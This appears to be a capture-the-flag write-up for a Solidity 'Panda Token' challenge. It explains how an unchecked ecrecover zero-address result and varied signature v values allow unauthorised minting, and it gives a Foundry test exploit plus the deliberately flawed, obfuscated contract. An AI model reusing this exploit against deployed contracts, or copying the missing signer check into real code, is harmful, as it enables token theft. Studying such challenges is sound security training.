## Panda Token attack

The Panda Token is vulnerable to a wrong implementation of the `ecrecover` function and not checking the signer.

`ecrecover` instead of reverting, returns the zero address as the signer. The current implementation in the `getTokens` functions is not checking if the signer is not the zero address and as the zero address has 10 ether in balanceOf(address(0)) the require check for the balance will always pass until it is used 10 times.

As we only need 3 tokens we just need to submit 3 different "valid" signatures.

`bytes memory signature` is decoded like
```solidity
assembly {
    r := mload(add(signature, 0x20))
    s := mload(add(signature, 0x40))
    v := byte(0, mload(add(signature, 0x60)))
}
```
So we just need to encode our signature like `abi.encode(r, s, v)`

To bypass the `used signature` check we can just use a different v for each call to bypass all checks and mint 3 times.

## Test

forge test --match-contract=PandaHackTest
```solidity
// SPDX-License-Identifier: MIT
pragma solidity 0.8.17;

import "forge-std/Test.sol";

import "openzeppelin/contracts/token/ERC20/ERC20.sol";
import "openzeppelin/contracts/access/Ownable.sol";

contract PandaHackTest is Test {
    PandaToken pandatoken;
    address owner = vm.addr(1);
    address hacker = vm.addr(2);

    function setUp() external {
        vm.prank(owner);
        pandatoken = new PandaToken(400, "PandaToken", "PND");
    }

    function test() public {
        vm.startPrank(hacker);
        bytes32 hash = keccak256(abi.encode(hacker, 1 ether));
        (uint8 v, bytes32 r, bytes32 s) = vm.sign(1, hash);

        // your goal - to have 3 tokens (3e18) on your own(hacker) balance.
        // solution
        bytes memory signature_1 = abi.encode(r, s, v);
        pandatoken.getTokens(1 ether, signature_1);
        
        bytes memory signature_2 = abi.encode(r, s, v + 1);
        pandatoken.getTokens(1 ether, signature_2);
        
        bytes memory signature_3 = abi.encode(r, s, v + 2);
        pandatoken.getTokens(1 ether, signature_3);

        assertEq(pandatoken.balanceOf(hacker), 3 ether);
    }
}

contract PandaToken is ERC20, Ownable {
    uint public c1;
    mapping(bytes => bool) public usedSignatures;
    mapping(address => uint) public burnPending;
    event show_uint(uint u);

    function sMint(uint amount) external onlyOwner {
        _mint(msg.sender, amount);
    }

    constructor(
        uint _c1,
        string memory tokenName,
        string memory tokenSymbol
    ) ERC20(tokenName, tokenSymbol) {
        assembly {
            let ptr := mload(0x40)
            mstore(ptr, sload(mul(1, 110)))
            mstore(add(ptr, 0x20), 0)
            let slot := keccak256(ptr, 0x40)
            sstore(slot, exp(10, add(4, mul(3, 5))))
            mstore(ptr, sload(5))
            sstore(6, _c1)
            mstore(add(ptr, 0x20), 0)
            let slot1 := keccak256(ptr, 0x40)
            mstore(ptr, sload(7))
            mstore(add(ptr, 0x20), 0)
            sstore(slot1, mul(sload(slot), 2))
        }
    }

    function calculateAmount(
        uint I1ILLI1L1ILLIL1LLI1IL1IL1IL1L
    ) public view returns (uint) {
        uint I1I1LI111IL1IL1LLI1IL1IL11L1L;
        assembly {
            let I1ILLI1L1IL1IL1LLI1IL1IL11L1L := 2
            let I1ILLILL1IL1IL1LLI1IL1IL11L1L := 1000
            let I1ILLI1L1IL1IL1LLI1IL1IL11L11 := 14382
            let I1ILLI1L1IL1ILLLLI1IL1IL11L1L := 14382
            let I1LLLI1L1IL1IL1LLI1IL1IL11L1L := 599
            let I1ILLI111IL1IL1LLI1IL1IL11L1L := 1
            I1I1LI111IL1IL1LLI1IL1IL11L1L := div(
                mul(
                    I1ILLI1L1ILLIL1LLI1IL1IL1IL1L,
                    I1ILLILL1IL1IL1LLI1IL1IL11L1L
                ),
                add(
                    I1LLLI1L1IL1IL1LLI1IL1IL11L1L,
                    add(I1ILLI111IL1IL1LLI1IL1IL11L1L, sload(6))
                )
            )
        }

        return I1I1LI111IL1IL1LLI1IL1IL11L1L;
    }

    function getTokens(uint amount, bytes memory signature) external {
        uint giftAmount = calculateAmount(amount);

        bytes32 msgHash = keccak256(abi.encode(msg.sender, giftAmount));
        bytes32 r;
        bytes32 s;
        uint8 v;

        assembly {
            r := mload(add(signature, 0x20))
            s := mload(add(signature, 0x40))
            v := byte(0, mload(add(signature, 0x60)))
        }

        address giftFrom = ecrecover(msgHash, v, r, s);
        burnPending[giftFrom] += amount;
        require(amount == 1 ether, "amount error");
        require(
            (balanceOf(giftFrom) - burnPending[giftFrom]) >= amount,
            "balance"
        );
        require(!usedSignatures[signature], "used signature");
        usedSignatures[signature] = true;
        _mint(msg.sender, amount);
    }

    function burnPendings(address burnFrom) external onlyOwner {
        burnPending[burnFrom] = 0;
        _burn(burnFrom, burnPending[burnFrom]);
    }
}
```
